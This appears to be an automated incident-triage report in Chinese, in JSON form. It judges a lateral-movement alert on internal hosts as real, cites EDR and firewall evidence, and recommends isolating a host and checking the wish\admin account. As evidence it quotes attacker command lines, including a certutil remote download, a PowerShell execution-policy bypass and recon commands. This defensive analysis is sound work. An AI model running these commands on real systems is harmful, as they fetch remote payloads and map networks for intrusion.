{
  "unified_event_id": "INC-20260912-000004",
  "verdict": "真实告警",
  "primary_claim": {
    "type": "LATERAL_MOVEMENT_REASONING",
    "result": "支持"
  },
  "secondary_findings": {
    "type": "远程命令执行",
    "description": "172.16.1.100 持续访问 172.16.2.99:8080，且 172.16.2.99 上出现由 Java 进程派生的 whoami、ipconfig、端口扫描、certutil 下载和 ping 扫描等命令，符合远程命令执行与后渗透行为。"
  },
  "confidence_score": 0.86,
  "attack_stage": "Lateral Movement",
  "technique": "T1021",
  "technique_name": "Remote Services",
  "verified_facts": [
    {
      "id": "F01",
      "fact": "172.16.1.100 与 172.16.2.99:8080 存在大量 TCP 连接，防火墙会话显示 pass，时间范围覆盖 2026-09-14 至 2026-09-29。",
      "source": "graph"
    },
    {
      "id": "F02",
      "fact": "172.16.2.99 上 Java 进程 java.exe 派生 cmd.exe 执行 whoami、ipconfig /all、netstat 端口扫描、certutil 下载 http://10.10.10.10:80/ 以及 ping 扫描等命令。",
      "source": "edr_detail"
    },
    {
      "id": "F03",
      "fact": "172.16.2.99 上检测到 SUSPICIOUS_RECON_CMD、LM_POST_EXPLOIT、HIGH_FREQ_PROCESS_SPAWN 和 C2_BEACON 事件，均关联 wish\\admin 会话。",
      "source": "edr_detail"
    },
    {
      "id": "F04",
      "fact": "172.16.2.110 上执行 Invoke-EdrUserSim.ps1，派生 whoami、ipconfig、net user、隐藏 PowerShell 和 taskkill 等命令，并出现 MALWARE_EXECUTION 事件。",
      "source": "edr_detail"
    },
    {
      "id": "F05",
      "fact": "172.16.2.109 上 SYSTEM 账户执行 secedit 导出、net user、auditpol 等命令，并伴随 SUSPICIOUS_RECON_CMD 和 HIGH_FREQ_PROCESS_SPAWN 事件。",
      "source": "edr_detail"
    },
    {
      "id": "F06",
      "fact": "172.16.2.99 的 related_hosts 中存在方向为 in 的 172.16.2.109，且 172.16.2.109 与 172.16.2.110 均存在高置信度后渗透行为。",
      "source": "graph"
    },
    {
      "id": "F07",
      "fact": "威胁情报未命中 10.10.10.133、172.16.1.100、172.16.2.109、172.16.2.110 和 172.16.2.99。",
      "source": "threat_intel"
    }
  ],
  "key_claims": [
    {
      "claim": "172.16.1.100 对 172.16.2.99:8080 的持续访问与 172.16.2.99 上的远程命令执行行为共同支持横向移动/远程服务访问。",
      "result": "支持",
      "evidence": [
        {
          "source": "graph",
          "field": "firewall_sessions[0]",
          "value": "source_ip=172.16.1.100, destination_ip=172.16.2.99, destination_port=8080, action=pass, pass_count=32230"
        },
        {
          "source": "edr_detail",
          "field": "entities[0].activity_segments[0].processes[1].cmdline",
          "value": "cmd.exe /c whoami"
        }
      ],
      "weight": 0.9
    },
    {
      "claim": "172.16.2.99 上存在由 Java 进程派生的侦察、下载和扫描命令，支持主机已被用于后渗透。",
      "result": "支持",
      "evidence": [
        {
          "source": "edr_detail",
          "field": "entities[0].activity_segments[0].processes[7].cmdline",
          "value": "certutil -urlcache -split -f http://10.10.10.10:80/ C:\\Temp\\_c1.txt"
        },
        {
          "source": "edr_detail",
          "field": "entities[0].activity_segments[0].processes[11].cmdline",
          "value": "ping -n 1 -w 200 10.10.10.20"
        }
      ],
      "weight": 0.85
    },
    {
      "claim": "172.16.2.110 上执行 EdrUserSim 脚本并触发 MALWARE_EXECUTION，支持多主机受控或横向移动后的执行。",
      "result": "支持",
      "evidence": [
        {
          "source": "edr_detail",
          "field": "entities[2].activity_segments[0].processes[2].cmdline",
          "value": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Users\\wish-wish10-pc\\Desktop\\Invoke-EdrUserSim.ps1\""
        },
        {
          "source": "edr_detail",
          "field": "entities[2].activity_segments[0].authentication_activities[4].event_type",
          "value": "MALWARE_EXECUTION"
        }
      ],
      "weight": 0.8
    }
  ],
  "counter_evidence": [],
  "uncertainty_notes": "威胁情报未命中相关 IP，且缺少 172.16.1.100 到 172.16.2.99 的明确认证凭据或会话映射，无法完全闭合远程服务类型；但进程父子关系、网络端点和多主机后渗透行为已足以支持真实告警。",
  "attack_chain_speculation": {
    "current_stage": "Lateral Movement",
    "observed_path": [
      {
        "description": "172.16.1.100 持续访问 172.16.2.99:8080，防火墙放行。",
        "fact_refs": [
          "F01"
        ]
      },
      {
        "description": "172.16.2.99 上 Java 进程派生 whoami、ipconfig、端口扫描、certutil 下载和 ping 扫描。",
        "fact_refs": [
          "F02",
          "F03"
        ]
      },
      {
        "description": "172.16.2.110 上执行 EdrUserSim 脚本并触发 MALWARE_EXECUTION，172.16.2.109 上出现 SYSTEM 账户侦察命令。",
        "fact_refs": [
          "F04",
          "F05",
          "F06"
        ]
      }
    ],
    "possible_next_steps": [
      {
        "technique": "T1059",
        "technique_name": "Command and Scripting Interpreter",
        "description": "继续通过 PowerShell/cmd 执行横向移动或凭据收集命令。"
      },
      {
        "technique": "T1041",
        "technique_name": "Exfiltration Over C2 Channel",
        "description": "通过已建立的 8080 通道外传数据或下载后续载荷。"
      }
    ],
    "supporting_evidence": [
      "F01",
      "F02",
      "F03",
      "F04",
      "F05",
      "F06"
    ]
  },
  "rule_optimization_suggestions": [
    {
      "rule": {
        "level": "威胁事件规则",
        "id": "900010",
        "name": "A2-主机沦陷-单主机高置信"
      },
      "suggestion": "将“远程 IP 持续访问目标端口 + 目标主机派生侦察/下载命令 + 多主机后渗透事件”作为主机沦陷与横向移动联合触发条件，减少单主机规则误报。"
    }
  ],
  "recommended_actions": [
    {
      "action": "隔离主机",
      "target": "172.16.2.99",
      "priority": "P1",
      "reason": "该主机存在远程命令执行、下载和扫描行为，且与 172.16.1.100 存在大量放行连接。"
    },
    {
      "action": "排查凭据与会话",
      "target": "wish\\admin",
      "priority": "P1",
      "reason": "172.16.2.99 上的后渗透命令均关联 wish\\admin 会话，需确认该账户是否被滥用。"
    }
  ],
  "reasoning_summary": "172.16.1.100 对 172.16.2.99:8080 的持续放行连接与 172.16.2.99 上 Java 派生的 whoami、ipconfig、certutil 下载和 ping 扫描形成远程服务访问与后渗透闭环。172.16.2.110 的 EdrUserSim 脚本执行和 MALWARE_EXECUTION 进一步支持多主机受控。威胁情报未命中和缺少明确认证凭据是主要缺口，但不改变真实告警结论。"
}
